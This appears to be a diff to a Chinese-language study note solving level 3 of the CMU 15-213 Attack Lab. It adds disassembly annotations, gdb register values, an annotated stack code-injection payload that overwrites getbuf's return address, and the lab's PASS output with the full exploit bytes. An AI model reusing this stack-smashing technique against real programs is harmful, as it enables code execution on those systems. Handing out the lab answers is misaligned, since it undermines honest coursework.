@@ -298,6 +298,7 @@ void touch3(char* sval)
   401905:	00 00 00 
   401908:	48 89 fe             	mov    %rdi,%rsi
   40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
+  # rsi=输入值,rdi=cookie地址
   401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
   401916:	85 c0                	test   %eax,%eax # &
   401918:	74 23                	je     40193d <touch3+0x43>
@@ -359,6 +360,7 @@ void touch3(char* sval)
   4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
   4018c9:	48 89 de             	mov    %rbx,%rsi
   4018cc:	48 89 ef             	mov    %rbp,%rdi
+  # &sval,s,9
   4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>
   4018d4:	85 c0                	test   %eax,%eax
   4018d6:	0f 94 c0             	sete   %al
@@ -376,15 +378,62 @@ void touch3(char* sval)
 
 ```
 
+> 当函数hexmatch和strncmp被调用时，它们会将数据push到栈上，覆盖存储getbuf使用的部分缓冲区内存。因此,小心放置cookie字符串的位置。
+
 `touch3:0x4018fa`
+
+> 注入的代码应将寄存器%rdi设置为此字符串的地址
 
 要做的：
 
 `mov (char* sval) %rdi; mov &touch3 (%rsp); ret; `
 
+满足`*sval==*(cbuf+random()%100)`
+
+`val=cookie`
+
+`*(6044e4)==cookie`
 
 
-test()->getbuf()->touchk()
+
+进入strncmp之前：
+
+```asm
+1: /x $rdi = 0x6044e4
+2: /x $rsi = 0x5561dc1b
+```
+
+
+
+
+
+```asm
+# 48 c7 c7 e4 44 60 00:mov $0 %rdi
+0x5561dc78:     0x48    0xc7    0xc7    0x1b    0xdc    0x61    0x55    0x48 
+# 48 c7 44 24 00 ec 17 40 00: mov 0x4018fa (%rsp)
+0x5561dc80:     0xc7    0x44    0x24    0x00    0xfa    0x18    0x40    0x00
+# c3:ret
+0x5561dc88:     0xc3    0x37    0x38    0x39    0x30    0x31    0x32    0x33
+
+0x5561dc90:     0x34    0x35    0x36    0x37    0x38    0x39    0x30    0x31
+0x5561dc98:     0x48    0xc7    0xc7    0x00    0x00    0x00    0x00    0x90
+
+# 调用Gets()的返回地址，即/x *(int*)$rsp = 0x4017b4，将其改为注入代码的地址
+# 0x5561dc78，即栈顶位置
+0x5561dca0:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
+```
+
+
+
+```asm
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 1B DC 61 55 48 C7 44 24 00 FA 18 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 48 C7 C7 00 00 00 00 90 78 DC 61 55 00 00 00 00
+```
 
 
 
